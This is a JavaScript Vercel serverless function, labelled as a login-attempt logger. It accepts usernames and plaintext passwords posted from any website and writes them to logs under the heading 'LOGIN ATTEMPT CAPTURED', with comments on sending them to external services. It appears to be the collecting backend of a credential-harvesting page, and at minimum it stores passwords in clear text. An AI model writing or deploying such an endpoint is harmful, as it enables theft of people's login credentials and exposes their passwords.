// Vercel Serverless Function to log login attempts
export default function handler(req, res) {
    // Set CORS headers to allow requests from your frontend
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight OPTIONS request
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only accept POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const { username, password, timestamp, success, userAgent, ip } = req.body;
        
        // Get client IP (Vercel provides this in headers)
        const clientIP = req.headers['x-forwarded-for'] || 
                        req.headers['x-real-ip'] || 
                        req.connection?.remoteAddress || 
                        'unknown';
        
        // Create log entry
        const logEntry = {
            timestamp: timestamp || new Date().toISOString(),
            username: username || 'unknown',
            password: password || '',
            success: success || false,
            ip: clientIP,
            userAgent: userAgent || req.headers['user-agent'] || 'unknown',
            referer: req.headers.referer || 'direct'
        };
        
        // Log to Vercel function logs (visible in Vercel dashboard)
        console.log('🚨 LOGIN ATTEMPT CAPTURED:', JSON.stringify(logEntry, null, 2));
        
        // You can extend this to:
        // 1. Store in a database (MongoDB, PostgreSQL, etc.)
        // 2. Send to external logging service (LogDNA, Datadog, etc.)
        // 3. Send alerts via email/Slack for suspicious activity
        // 4. Store in a simple file (though not recommended for production)
        
        // Example: Send alert for multiple failed attempts
        if (!success) {
            console.log(`⚠️  FAILED LOGIN ATTEMPT for ${username} from IP: ${clientIP}`);
        } else {
            console.log(`✅ SUCCESSFUL LOGIN for ${username} from IP: ${clientIP}`);
        }
        
        // Respond with success
        return res.status(200).json({ 
            message: 'Login attempt logged successfully',
            logged: true,
            timestamp: logEntry.timestamp
        });
        
    } catch (error) {
        console.error('Error logging attempt:', error);
        return res.status(500).json({ 
            error: 'Failed to log attempt',
            logged: false 
        });
    }
}